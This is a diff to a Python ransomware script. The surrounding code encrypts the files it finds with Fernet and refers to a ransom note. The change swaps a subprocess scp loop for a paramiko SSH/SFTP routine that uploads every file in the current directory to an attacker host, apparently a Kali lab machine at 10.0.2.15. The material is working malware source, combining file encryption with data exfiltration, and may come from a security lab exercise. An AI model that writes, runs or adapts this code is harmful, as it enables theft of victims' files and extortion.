@@ -4,6 +4,7 @@ from cryptography.fernet import Fernet
 import os
 import time
 import subprocess
+import paramiko
 
 #find files
 
@@ -32,16 +33,31 @@ for file in  files:
         with open(file, "wb") as thefile:
              thefile.write(contents_encrypted)
 
-# exfiltrate files using SCP
+# Exfiltrate files using SCP
              
-for file in files:
-    source_file = file
-    destination_ip = "10.0.2.15"  # Replace with the actual IP
-    destination_username = "kali"  # Replace with the actual username
-    destination_path = "/home/kali/Desktop/exfildata/"  # Location to exfiltrate data
+destination_ip = "10.0.2.15"  # Replace with the actual IP
+destination_username = "kali"  # Replace with the actual username
+destination_path = "/home/kali/Desktop/exfildata/"  # Location to exfiltrate data
 
-    subprocess.run(["scp", source_file, f"{destination_username}@{destination_ip}:{destination_path}"])
-    print(f"File {file} exfiltrated using SCP")
+# List all files in the current directory
+files = [f for f in os.listdir() if os.path.isfile(f)]
+
+# Establish SSH connection
+ssh = paramiko.SSHClient()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+ssh.connect(destination_ip, username=destination_username)
+
+# SCP the files
+for file in files:
+    source_file = os.path.join(os.getcwd(), file)
+    destination_file = f"{destination_path}/{file}"
+    sftp = ssh.open_sftp()
+    sftp.put(source_file, destination_file)
+    sftp.close()
+    print(f"File {file} exfiltrated using SCP to {destination_ip}:{destination_path}")
+
+# Close SSH connection
+ssh.close()
 
 # ransom note
 
